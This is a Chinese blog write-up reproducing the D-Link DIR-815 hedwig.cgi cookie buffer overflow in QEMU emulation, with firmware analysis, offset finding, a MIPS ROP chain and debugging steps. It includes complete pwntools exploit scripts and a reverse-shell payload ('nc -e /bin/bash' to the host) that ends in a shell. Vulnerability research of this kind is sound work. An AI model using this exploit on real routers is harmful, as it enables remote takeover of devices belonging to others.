---
layout: page
title: D-LINK DIR-815多次溢出漏洞
author: curve
cover: true
sidebar: []
readmore: true
date: 2024-12-16
tags: 
- 公众号推文
- 二进制安全
categories:
- 公众号推文
---


发布时间: 

title: D-LINK DIR-815多次溢出漏洞 author: 1ens tags: - 漏洞复现 categories: - iot date:
2022-08-25

**准备**

参考：[原创]家用路由器漏洞挖掘实例分析[图解D-LINK DIR-815多次溢出漏洞]-智能设备-看雪论坛-安全社区|安全招聘|bbs.pediy.com

该漏洞的描述位于这里，可知漏洞出现在`hedwig.cgi`文件中，漏洞产生的原因是Cookie的值超长造成缓冲区溢出。首先了解一下`cgi`文件。

> `cgi(Common Gateway Interface)`，通用网关接口。运行在服务器上提供同客户端 HTML 页面的接口的一段程序。

固件下载地址

http://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/DIR-815_REVA_FIRMWARE_v1.01.ZIP

binwalk解压固件

![](/images/D-LINK DIR-815多次溢出漏洞/1752587184130.png)

  

查看**bin/busybox** 得知是MIPS32，小端：

![](/images/D-LINK DIR-815多次溢出漏洞/1752587184241.png)

  

###

**寻找线索**

###

` find . -name '*cgi'`查找文件

并`ls -l
./htdocs/web/hedwig.cgi`发现hedwig.cgi是指向./htdocs/cgibin的符号链接，也就是说真正的漏洞代码在cgibin中。

  

**静态分析**

IDA静态调试`cgibin`文件，`hedwigcgi_main`函数处理整个过程，由于是`HTTP_COOK`这个字段引起的漏洞溢出点，可以在IDA（SHIFT+F12）搜索字符串，然后通过X，交叉引用来跟踪到`hedwigcgi_main`函数条用的位置。

跟踪到主函数的位置hedwigcgi_main，对函数功能进行大致分析，可以定位到其中的`sprintf`函数引起了栈溢出。调用`sess_get_uid`，得到`HTTP_COOKIE`的值。同样创建两个指针数组`a1,a2`，以等号为界将前半部分存入`a1`偏移为5处，后半部分存入`a2`偏移为5处，`a1[5]`为`uid`则将`a2[5]`存入参数指针数组的偏移为5处。函数`sobj_get_string`获得该数组中指向`cookie`的指针。

![](/images/D-LINK DIR-815多次溢出漏洞/1752587184394.png)

  

**IDA动态调试-确定偏移位置**

程序通过 getenv 的方式获取 HTTP 数据包中的数据，流程应该为：


​    
​    主Web程序监听端口->传送HTTP数据包->  
​    HTTP中headers等数据通过环境变量的方式传给cgi处理程序->  
​    cgi程序通过getenv获取数据并处理返回给主程序->向客户端返回响应数据  
​    #POST具体数据可以通过类似输入流传入 ：echo "uid=aaa"| /htdocs/web/hedwig.cgi

测试脚本test.sh


​    
​    #!/bin/bash  
​    #注意：里面=和变量之间一定不要有空格，坑，否则读入空数据。  
​    test=$(python -c "print ('uid='+open('content','r').read(2000))") #方式一，以文件形式读入内容，提前填充好构造的数据到content文件  
​    #test=$(python -c "print 'uid=' + 'A'*0x600" )#方式二，直接后面接数据内容  
​    #test=$(python -c "print 'uid='+open('exploit','r').read()")  
​    #test =$(python -c "print 'uid=' + 'A'*1043 + 'B'*4")#可选构造数据  
​       
​    LEN=$(echo -n "$test" | wc -c)      
​    PORT="1234"  
​    cp $(which qemu-mipsel-static) ./qemu  
​    sudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$test -E REQUEST_URL="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/hedwig.cgi 2>/dev/null      
​    #-E参数：加入环境变量 ；2>/dev/null ：不输出提示错误  
​    rm -f ./qemu

利用patternLocOffset.py生成content文件，包含特定格式的2000个字符串。类似于cyclic


​    
​    python patternLocOffset.py  -c  -l  2000 -f content

在0x0409A38处断下

![](/images/D-LINK DIR-815多次溢出漏洞/1752587184732.png)![](/images/D-LINK
DIR-815多次溢出漏洞/1752587185298.png)

`python patternLocOffset.py -s 0x38694237 -l 2000`计算偏移：

![](/images/D-LINK DIR-815多次溢出漏洞/1752587185374.png)

跟完`sess_get_uid()`函数可发现后面还有一个`sprintf()`，这里也会造成栈溢出，哪到底哪个才是真正的利用点呢

从整个函数可以看出，`fopen("/var/tmp/temp.xml",
"w")`的成功与否会导致程序走向这两个地方，即成功后是第二个`sprintf()`为溢出利用点，而失败时是第一个`sprintf()`为溢出利用点

如果 `fopen("/var/tmp/temp.xml", "w")` 打开成功则会执行到第二个
`sprintf`，因为没有实机没法判断实际固件中是否有这个目录

因此我们手动创建该目录及文件


​    
​    mkdir var/tmp  
​    touch var/tmp/temp.xml

这里假设第二个`sprintf()`为漏洞点（其实是第一个还是第二个对于用户模式下的调试并没有多大关系，就是偏移不一样罢了，构造 rop
链方法都是一样的），所以偏移得重新计算

![](/images/D-LINK DIR-815多次溢出漏洞/1752587185429.png)

但是haystack为0的话无法走到第二个sprintf

![](/images/D-LINK DIR-815多次溢出漏洞/1752587185517.png)

交叉引用找到这

动调可知在sub_402B40函数，这里影响着haystack的赋值

![](/images/D-LINK DIR-815多次溢出漏洞/1752587185583.png)

这部分前面的代码，可知随便传点参数即可

参考D-Link DIR-815 路由器多次溢出漏洞分析 | Lantern's 小站
    
    
    #!/bin/bash  
    # test2.sh  
      
    INPUT="x=x"  
    COOKIE=$(python -c "print('uid=' + open('context','r').read())")  
    PORT="1234"  
    LEN=$(echo -n "$INPUT" | wc -c)  
    cp $(which qemu-mipsel-static) ./qemu  
      
    echo $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$COOKIE -E REQUEST_URI="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1"  -g $PORT /htdocs/web/hedwig.cgi  
    rm -f ./qemu

![](/images/D-LINK DIR-815多次溢出漏洞/1752587185654.png)![](/images/D-LINK
DIR-815多次溢出漏洞/1752587185715.png)

最终的偏移为1009.

  

**ROP 链的构造**

#### **gdb-multiarch+QEMU动态调试分析验证**

1，通过gdb指定脚本调试（避免重复输入，重复造轮子浪费时间）


​    
​    set architecture mips  
​    set endian little  
​    target remote :1234  
​    b *0x409a54  
​    c  
​    vmmap

执行 #一定要加载文件htdocs/cgibin不然vmmap得不到结果


​    
​    gdb-multiarch htdocs/cgibin -x dbgscript

-x是指定要执行的命令文件

but...还是每找到完整的vmmap

![](/images/D-LINK DIR-815多次溢出漏洞/1752587185845.png)

但实际上，我们查看 `lib` 目录下的 `libc.so.0` 即可知

![](/images/D-LINK DIR-815多次溢出漏洞/1752587185917.png)

找到systeam的地址

![](/images/D-LINK DIR-815多次溢出漏洞/1752587185999.png)

另外一种方法


​    
​    from pwn import *  
​    context.arch = "mips"  
​    context.endian = "little"  
​      
​    libc = ELF("./lib/libuClibc-0.9.30.1.so")  
​    libc.address = 0x77fe2000 # base address rop链的基地址，确定方法在后面  
​    system_addr = libc.symbols['system']  
​    log.success("system address: 0x%x" % system_addr)

得到 system address: 0x7f78b200

  

然后便是找一个能将 `system()` 首个参数写入 `$a0` 的 gadget，这里在 `libuClibc-0.9.30.1.so` 中使用
`mipsrop` 插件，利用 `mipsrop.stackfinder()` 命令找将栈上数据放入寄存器的 gadget：

![](/images/D-LINK DIR-815多次溢出漏洞/1752587186117.png)

打开 mips rop gadgets

然后命令行输入mipsrop.stackfinders()

![](/images/D-LINK DIR-815多次溢出漏洞/1752587186234.png)

选择0x159cc的指令。该指令序列首先将SP+0x10（动调）地址存入寄存器S5中，而在偏移0x159EO处将$S5作为参数存入
Sa0，也就是说，这里需要将第一步得到的system地址填充到$So中，然后在$SP+0x10处填充需要执行的命令，即可实现对system(""command")函数的调用。

![](/images/D-LINK DIR-815多次溢出漏洞/1752587186331.png)

  

因为 system地址的最低位为0x00，而在 hedwig_main获取Cookie的过程中，也没有对这部分数据进行解码，所以，试图通过访问
hedwig.cgi时对Cookie进行编码来避开0x00是不可能的，这就使 sprintf函数可能被截断，造成缓冲区溢出失败。为了避开
`0x00`，写入时- 1 ，后面再找一个 gadget 加一即可

  

`hedwigcgi_main()` 结尾部分：

![](/images/D-LINK DIR-815多次溢出漏洞/1752587186447.png)

修改


​    
​    $s0  
​    $s1  
​    $s2  
​    $s3  
​    $s4  
​    $s5  
​    $s6  
​    $s7  
​    $fp  
​    $ra <== 返回地址

ROP的思路

![](/images/D-LINK DIR-815多次溢出漏洞/1752587186551.png)

  


​    
​    from pwn import *  
​    from MIPSPayload import MIPSPayload  
​    import string, random, sys  
​    class MIPSPayload:  
​        BADBYTES = b"\x00"  
​        LITTLE = "little"  
​        BIG = "big"  
​        FILLER = b"A"  
​        BYTES = 4  
​        def __init__(self, elfbase:int, endian:str = LITTLE, badbytes: bytes = BADBYTES):  
​            self.elfbase = elfbase  
​            self.badbytes = badbytes  
​            self.endian = endian  
​            self.payload = bytes()  
​      
```python
    def rand_text(self, size):  
        table = (string.ascii_letters + string.digits).encode()  
        return bytes(random.choices(table, k=size))  
  
    def Add(self, data):  
        if type(data) is bytes:  
            self.payload += data  
        else:  
            raise TypeError("%s is no support type" % type(data))  
  
    def Address(self, offset, base=None):  
        if base is None:  
            base = self.elfbase  
        return self.ToBytes(base + offset)  
  
    def AddAddress(self, offset, base=None):  
        self.Add(self.Address(offset, base))  
  
    def ToBytes(self, value, size=BYTES):  
        data = [(value >> (8 * i)) & 0xff for i in range(size)]  
        if self.endian != self.LITTLE:  
            data = data[::-1]  
        return bytes(data)  
  
    def AddNOPs(self, size):  
        self.Add(self.rand_text(size))  
  
    def AddBuffer(self, size, byte=FILLER):  
        self.Add(byte * size)  
  
    def Build(self):  
        count = 0  
        for c in self.payload:  
            if self.badbytes.find(c) != -1:  
                raise ValueError("Bad byte found in payload at offset %d: 0x%.2X" % (count, c))  
        count += 1  
        return self.payload  
  
    def Print(self, bpl = BYTES):  
        i = 0  
        for c in self.payload:  
            if i == 4:  
                print()  
                i = 0  
            sys.stdout.write("\\x%.2X" % c)  
            sys.stdout.flush()  
            if bpl > 0:  
                i += 1  
        print("\n")  
context.arch = "mips"  
context.endian = "little"  
context.log_level = "debug"  
  
payload = MIPSPayload(0x7f738000)  
  
libc = ELF("./lib/libuClibc-0.9.30.1.so")  
libc.address = 0x77fe2000  
system_addr = libc.symbols['system']  
log.success("system address: 0x%x" % system_addr)  
calcsystem = 0x158c8    # $s0 add 1, jalr $s5  
callsystem = 0x159cc    # cmd -> $a0, jalr $s0 (system_addr)  
  
payload.AddBuffer(0x3CD)                    #       973  
payload.AddAddress(system_addr - 1)         # $s0   977  
payload.AddBuffer(4)                        # $s1   981  
payload.AddBuffer(4)                        # $s2   985  
payload.AddBuffer(4)                        # $s3   989  
payload.AddBuffer(4)                        # $s4   993                       
payload.AddAddress(callsystem)              # $s5   997  
payload.AddBuffer(4)                        # $s6   1001  
payload.AddBuffer(4)                        # $s7   1005  
payload.AddBuffer(4)                        # $fp   1009  
payload.AddAddress(calcsystem)              # $ra  
payload.AddBuffer(0x10)                     # .text:000159CC  addiu   $s5, $sp, 0x170+var_160  
payload.Add(b'//bin/sh')  
  
f = open("exploit", 'wb+')  
f.write(payload.Build())  
f.close()
```

  





**qemu系统模式**

这里主要是为了在qemu虚拟机中重现http服务。

`/sbin/httpd`应该是用于监听web端口的http服务，同时查看`/htdocs/web`文件夹下的cgi文件和php文件，可以了解到接受到的数据通过php+cgi来处理并返回客户端。

`find ./ -name '*http*'`找到web配置文件httpcfg.php

![](/images/D-LINK DIR-815多次溢出漏洞/1752587186708.png)

查看内容后分析出`httpcfg.php`文件的作用是生成供所需服务的`配置文件`的内容，所以我们参照里面内容，自己创建一个conf作为生成的`配置文件`，填充我们所需的内容。（留个坑，暂时没搞懂）


​    
​    Umask 026  
​    PIDFile /var/run/httpd.pid  
​    LogGMT On  #开启log  
​    ErrorLog /log #log文件  
​      
​    Tuning  
​    {  
​        NumConnections 15  
​        BufSize 12288  
​        InputBufSize 4096  
​        ScriptBufSize 4096  
​        NumHeaders 100  
​        Timeout 60  
​        ScriptTimeout 60  
​    }  
​      
​    Control  
​    {  
​        Types  
​        {  
​            text/html    { html htm }  
​            text/xml    { xml }  
​            text/plain    { txt }  
​            image/gif    { gif }  
​            image/jpeg    { jpg }  
​            text/css    { css }  
​            application/octet-stream { * }  
​        }  
​        Specials  
​        {  
​            Dump        { /dump }  
​            CGI            { cgi }  
​            Imagemap    { map }  
​            Redirect    { url }  
​        }  
​        External  
​        {  
​            /usr/sbin/phpcgi { php }  
​        }  
​    }  

```
    Server  
​    {  
​        ServerName "Linux, HTTP/1.1, "  
​        ServerId "1234"  
​        Family inet  
​        Interface eth0 #对应qemu仿真路由器系统的网卡  
​        Address 192.168.40.138 #qemu仿真路由器系统的IP  
​        Port "1234" #对应未被使用的端口  
​        Virtual  
​        {  
​            AnyHost  
​            Control  
​            {  
​                Alias /  
​                Location /htdocs/web  
​                IndexNames { index.php }  
​                External  
​                {  
​                    /usr/sbin/phpcgi { router_info.xml }  
​                    /usr/sbin/phpcgi { post_login.xml }  
​                }  
​            }  
​            Control  
​            {  
​                Alias /HNAP1  
​                Location /htdocs/HNAP1  
​                External  
​                {  
​                    /usr/sbin/hnap { hnap }  
​                }  
​                IndexNames { index.hnap }  
​            }  
​        }  
​    }

```


使用qemu-system-mipsel从系统角度进行模拟，就需要一个mips架构的内核镜像和文件系统。可以在如下网站下载：Index of
/~aurel32/qemu

因为是小端，这里直接选择mipsel，然后下载其中两个文件：

![](/images/D-LINK DIR-815多次溢出漏洞/1752587186762.png)

**debian_squeeze_mipsel_standard.qcow2** 是文件系统，**vmlinux-3.2.0-4-4kc-malta**
是内核镜像

启动脚本start.sh


​    
​    sudo qemu-system-mipsel \  
​    -M malta \  
​    -kernel vmlinux-3.2.0-4-4kc-malta \  
​    -hda debian_squeeze_mipsel_standard.qcow2 \  
​    -append "root=/dev/sda1 console=tty0" \  
​    -net nic \  
​    -net tap \  
​    -nographic \

![](/images/D-LINK DIR-815多次溢出漏洞/1752587186842.png)

输入用户名/密码 root/root或user/user即可登录qemu模拟的系统

![](/images/D-LINK DIR-815多次溢出漏洞/1752587186926.png)

接下来在宿主机创建一个网卡，使qemu内能和宿主机通信。

安装依赖库：


​    
​    sudo apt-get install bridge-utils uml-utilities

在宿主机编写如下文件保存为net.sh并运行：


​    
​    sudo sysctl -w net.ipv4.ip_forward=1  
​    sudo iptables -F  
​    sudo iptables -X  
​    sudo iptables -t nat -F  
​    sudo iptables -t nat -X  
​    sudo iptables -t mangle -F  
​    sudo iptables -t mangle -X  
​    sudo iptables -P INPUT ACCEPT  
​    sudo iptables -P FORWARD ACCEPT  
​    sudo iptables -P OUTPUT ACCEPT  
​    sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE  
​    sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT  
​    sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT  
​    sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0

![](/images/D-LINK DIR-815多次溢出漏洞/1752587187141.png)

然后配置qemu虚拟系统的路由，在qemu虚拟系统中编写net.sh并运行：


​    
​    #！/bin/sh  
​     ifconfig eth0 192.168.100.2 netmask 255.255.255.0  
​    route add default gw 192.168.100.254

eth0的网卡是192.168.100.2并且可以和宿主机ping通表示成功

![](/images/D-LINK DIR-815多次溢出漏洞/1752587187207.png)

随后使用`scp`命令将binwalk解压出来的**squashfs-root** 文件夹上传到qemu系统中的**/root** 路径下：


​    
​    scp -r squashfs-root/ root@192.168.100.2:/root

然后在qemu虚拟系统中将**squashfs-root**
文件夹下的库文件替换掉原有的，此操作会改变文件系统，如果不小心退出了虚拟系统，再次启动qemu时会失败，原因是因为改变了文件系统的内容。此时需要使用新的文件系统，因此在此操作之前可以先备份一份。编写auto.sh并执行：


​    
​    cp sbin/httpd /  
​    cp -rf htdocs/ /  
​    rm -rf /etc/services  
​    cp -rf etc/ /  
​    cp lib/ld-uClibc-0.9.30.1.so  /lib/  
​    cp lib/libcrypt-0.9.30.1.so  /lib/  
​    cp lib/libc.so.0  /lib/  
​    cp lib/libgcc_s.so.1  /lib/  
​    cp lib/ld-uClibc.so.0  /lib/  
​    cp lib/libcrypt.so.0  /lib/  
​    cp lib/libgcc_s.so  /lib/  
​    cp lib/libuClibc-0.9.30.1.so  /lib/  
​    cd /  
​    ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi  
​    ln -s /htdocs/cgibin /usr/sbin/phpcgi

接下来在qemu虚拟系统的根目录（ / ）下，创建一个名为conf的文件，此文件是httpd服务的配置文件。内容如下：

```


​    Umask 026  
​    PIDFile /var/run/httpd.pid  
​    LogGMT On  #开启log  
​    ErrorLog /log #log文件  
​    Tuning  
​    {  
​        NumConnections 15  
​        BufSize 12288  
​        InputBufSize 4096  
​        ScriptBufSize 4096  
​        NumHeaders 100  
​        Timeout 60  
​        ScriptTimeout 60  
​    }  
​    Control  
​    {  
​        Types  
​        {  
​            text/html    { html htm }  
​            text/xml    { xml }  
​            text/plain    { txt }  
​            image/gif    { gif }  
​            image/jpeg    { jpg }  
​            text/css    { css }  
​            application/octet-stream { * }  
​        }  
​        Specials  
​        {  
​            Dump        { /dump }  
​            CGI            { cgi }  
​            Imagemap    { map }  
​            Redirect    { url }  
​        }  
​        External  
​        {  
​            /usr/sbin/phpcgi { php }  
​        }  
​    }  
​    Server  
​    {  
​        ServerName "Linux, HTTP/1.1, "  
​        ServerId "1234"  
​        Family inet  
​        Interface eth0         #网卡  
​        Address 192.168.100.2  #qemu的ip地址  
​        Port "4321"            #对应web访问端口  
​        Virtual  
​        {  
​            AnyHost  
​            Control  
​            {  
​                Alias /  
​                Location /htdocs/web  
​                IndexNames { index.php }  
​                External  
​                {  
​                    /usr/sbin/phpcgi { router_info.xml }  
​                    /usr/sbin/phpcgi { post_login.xml }  
​                }  
​            }  
​            Control  
​            {  
​                Alias /HNAP1  
​                Location /htdocs/HNAP1  
​                External  
​                {  
​                    /usr/sbin/hnap { hnap }  
​                }  
​                IndexNames { index.hnap }  
​            }  
​        }  
​    }
```
最后启动httpd服务：


​    ./httpd -f conf

![](/images/D-LINK DIR-815多次溢出漏洞/1752587187448.png)

这里访问失败是因为hedwig.cgi服务没有收到请求，需要提前配置qemu虚拟环境中的`REQUEST_METHOD`等方法，因为httpd是读取的环境变量，这里就直接通过环境变量进行设置：


​    
​    export CONTENT_LENGTH="100"  
​    export CONTENT_TYPE="application/x-www-form-urlencoded"  
​    export REQUEST_METHOD="POST"  
​    export REQUEST_URI="/hedwig.cgi"  
​    export HTTP_COOKIE="uid=1234"

这里在qemu虚拟系统中运行hedwig.cgi，再次访问http://192.168.100.2:4321/hedwig.cgi就可以正常收到内容了

![](/images/D-LINK DIR-815多次溢出漏洞/1752587187542.png)

接下来就是使用gdbserver对hedwig.cgi进行调试了。

  

  

**gdbserver调试**

动态调试确定偏移但是在那之前需要关掉地址随机化，因为qemu的虚拟机内核开启了地址随机化，每次堆的地址都在变化，导致libc的基地址也不断在变，所以需要关闭地址随机化


​    
​    echo 0 > /proc/sys/kernel/randomize_va_space

注：正常路由环境和 MIPS 虚拟机中为了程序运行速度会取消 canary，地址随机化等保护机制

这里需要提前将 MIPSEL 架构的 gdbserver 传到 qemu 虚拟机中，这里选择了别人编译好的 gdbserver

auto.shell


​    
​    #!/bin/bash  
​    export CONTENT_LENGTH="100"  
​    export CONTENT_TYPE="application/x-www-form-urlencoded"  
​    export HTTP_COOKIE="uid=`cat content`"   #content你自己构造的数据内容，原本是没有的按上面所述的方式去创建  
​    export REQUEST_METHOD="POST"  
​    export REQUEST_URI="/hedwig.cgi"  
​    echo "uid=1234"|./gdbserver 192.168.100.254:8888 /htdocs/web/hedwig.cgi #IP为宿主机IP

宿主机连接 gdbserver


​    
​    gdb-multiarch htdocs/cgibin  
​    set architecture mips  
​    target remote 192.168.100.2:8888 #对应qemu地址和端口

这里我们终于可以看到vmmap

![](/images/D-LINK DIR-815多次溢出漏洞/1752587187655.png)

接下来是确定libc的基地址，需要先把环境变量配置好，不然/htdocs/web/hedwig.cgi很快就执行完，进程立马就结束了，就得不到maps。

利用（注意根据会先pid规律，快速修改预测pid执行，否则maps地址数据不会出来）


​    
​    /htdocs/web/hedwig.cgi & cat /proc/pid/maps

**a &b
先执行a，在执行b，无论a成功与否都会执行b**。因为关闭了地址随机化，libc.so.0的基地址就是0x77f34000。这里的libc.so.0是指向libuClibc-0.9.30.1.so。所以libuClibc-0.9.30.1.so基地址为0x77f34000。

![](/images/D-LINK DIR-815多次溢出漏洞/1752587187709.png)


​    
​    export CONTENT_LENGTH="100"  
​    root@debian-mipsel:~# export CONTENT_TYPE="application/x-www-form-urlencoded"  
​    root@debian-mipsel:~# export HTTP_COOKIE="uid=1234"  
​    root@debian-mipsel:~# export REQUEST_METHOD="POST"  
​    root@debian-mipsel:~# export REQUEST_URI="/hedwig.cgi"  
​    root@debian-mipsel:~# /htdocs/web/hedwig.cgi & cat /proc/pid/maps  
​    [2] 1224  
​    cat: /proc/pid/maps: No such file or directory  
​    root@debian-mipsel:~# /htdocs/web/hedwig.cgi & cat /proc/1226/maps  
​    [3] 1226  
​    00400000-0041c000 r-xp 00000000 08:01 32694      /htdocs/cgibin  
​    0042c000-0042d000 rw-p 0001c000 08:01 32694      /htdocs/cgibin  
​    0042d000-0042f000 rwxp 00000000 00:00 0          [heap]  
​    77f34000-77f92000 r-xp 00000000 08:01 547906     /lib/libc.so.0  
​    77f92000-77fa1000 ---p 00000000 00:00 0   
​    77fa1000-77fa2000 r--p 0005d000 08:01 547906     /lib/libc.so.0  
​    77fa2000-77fa3000 rw-p 0005e000 08:01 547906     /lib/libc.so.0  
​    77fa3000-77fa8000 rw-p 00000000 00:00 0   
​    77fa8000-77fd1000 r-xp 00000000 08:01 546761     /lib/libgcc_s.so.1  
​    77fd1000-77fe1000 ---p 00000000 00:00 0   
​    77fe1000-77fe2000 rw-p 00029000 08:01 546761     /lib/libgcc_s.so.1  
​    77fe2000-77fe7000 r-xp 00000000 08:01 547907     /lib/ld-uClibc.so.0  
​    77ff5000-77ff6000 rw-p 00000000 00:00 0   
​    77ff6000-77ff7000 r--p 00004000 08:01 547907     /lib/ld-uClibc.so.0  
​    77ff7000-77ff8000 rw-p 00005000 08:01 547907     /lib/ld-uClibc.so.0  
​    7ffd6000-7fff7000 rwxp 00000000 00:00 0          [stack]  
​    7fff7000-7fff8000 r-xp 00000000 00:00 0          [vdso]

编写exp（注意是py2


​    
​    #!/usr/bin/python2  
​    from pwn import *  
​    context.endian = "little"  
​    context.arch = "mips"  
​    base_addr = 0x77f34000  
​    system_addr_1 = 0x53200-1  
​    gadget1 = 0x45988  
​    gadget2 = 0x159cc  
​      
​    cmd = 'nc -e /bin/bash 192.168.100.254 9999'  
​    padding = 'A' * 973 #1009-4*9  
​    padding += p32(base_addr + system_addr_1) # s0  
​    padding += p32(base_addr + gadget2)       # s1  
​    padding += 'A' * 4                        # s2  
​    padding += 'A' * 4                        # s3  
​    padding += 'A' * 4                        # s4  
​    padding += 'A' * 4                           # s5  
​    padding += 'A' * 4                        # s6  
​    padding += 'A' * 4                        # s7  
​    padding += 'A' * 4                        # fp  
​    padding += p32(base_addr + gadget1)       # ra  
​    padding += 'B' * 0x10  
​    padding += cmd  
​      
​    f = open("context",'wb')  
​    f.write(padding)  
​    f.close()

生成的context通过scp拷贝到mips虚拟机~目录中并且在~目录下创造debug.sh


​    
​    export CONTENT_LENGTH="100"  
​    export CONTENT_TYPE="application/x-www-form-urlencoded"  
​    export HTTP_COOKIE="uid=`cat context`"  
​    export REQUEST_METHOD="POST"  
​    export REQUEST_URI="/hedwig.cgi"  
​    echo "uid=1234"|/htdocs/web/hedwig.cgi

在宿主机运行


​    
​    nc -vlp 9999

然后再mips虚拟机执行debug.sh

![](/images/D-LINK DIR-815多次溢出漏洞/1752587187801.png)

getshell !

  


**总结**  

  

**断断停停终于算是真正完整复现了第一个漏洞，dlink
DIR-815，依照0day路由器漏洞挖掘还有师傅们的博客，对mips架构和qemu有了进一步的了解**

  

  

  

  

